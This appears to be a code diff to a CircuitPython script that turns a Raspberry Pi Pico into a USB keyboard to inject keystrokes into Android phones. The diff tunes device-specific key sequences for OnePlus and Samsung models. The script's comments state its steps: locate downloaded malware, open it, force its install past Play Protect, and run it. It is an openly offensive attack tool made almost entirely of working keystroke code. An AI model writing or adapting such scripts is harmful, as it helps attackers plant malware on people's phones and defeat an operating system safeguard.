@@ -9,8 +9,13 @@ from keyboard_layout_win_sf import KeyboardLayout
 from keycode_win_sf import Keycode
 
 # Select the device
-## Liste : OnePlus, Samsung.
-device = "OnePlus"
+OnePlusDevice = False
+device = "SGS9E"
+OnePlus = ["OP7P", "OP8P"]
+
+SamsungDevice = True
+device = "SGS9E"
+Samsung = ["SGS9E"]
 
 # Load Raspberry Pi Pico as HID Keyboard device
 keyboard = Keyboard(usb_hid.devices)
@@ -81,7 +86,7 @@ keyboard.release_all()
 time.sleep(0.5)
 
 # Locate the downloaded malware on download page
-if device == "OnePlus":
+if OnePlusDevice == True:
     keyboard.press(Keycode.TAB)
     keyboard.release_all()
     time.sleep(0.5)
@@ -99,8 +104,8 @@ if device == "OnePlus":
     time.sleep(0.5)
     keyboard.press(Keycode.ENTER)
     keyboard.release_all()
-    time.sleep(2.5)
-elif device == "Samsung":
+    time.sleep(1.5)
+elif SamsungDevice == True:
     keyboard.press(Keycode.DOWN_ARROW)
     keyboard.release_all()
     time.sleep(0.5)
@@ -125,7 +130,7 @@ else:
     time.sleep(1.0)
 
 # Open the malware to install it
-if device == "OnePlus":
+if OnePlusDevice == True:
     keyboard.press(Keycode.TAB)
     keyboard.release_all()
     time.sleep(0.5)
@@ -135,10 +140,14 @@ if device == "OnePlus":
     keyboard.press(Keycode.TAB)
     keyboard.release_all()
     time.sleep(0.5)
+    if device == "OP8P":
+            keyboard.press(Keycode.TAB)
+            keyboard.release_all()
+            time.sleep(0.5)
     keyboard.press(Keycode.ENTER)
     keyboard.release_all()
     time.sleep(1.5)
-elif device == "Samsung":
+elif SamsungDevice == True:
     keyboard.press(Keycode.TAB)
     keyboard.release_all()
     time.sleep(0.5)
@@ -160,7 +169,7 @@ else:
     time.sleep(1.0)
 
 # Force install once blocked by play protect
-if device == "Samsung":
+if SamsungDevice == True:
     keyboard.press(Keycode.TAB)
     keyboard.release_all()
     time.sleep(0.5)
@@ -172,11 +181,11 @@ if device == "Samsung":
     time.sleep(2.5)
 
 # Run the malware
-if device == "OnePlus":
+if OnePlusDevice == True:
     keyboard.press(Keycode.ENTER)
     keyboard.release_all()
     time.sleep(0.5)
-elif device == "Samsung":
+elif SamsungDevice == True:
     keyboard.press(Keycode.TAB)
     keyboard.release_all()
     time.sleep(0.5)
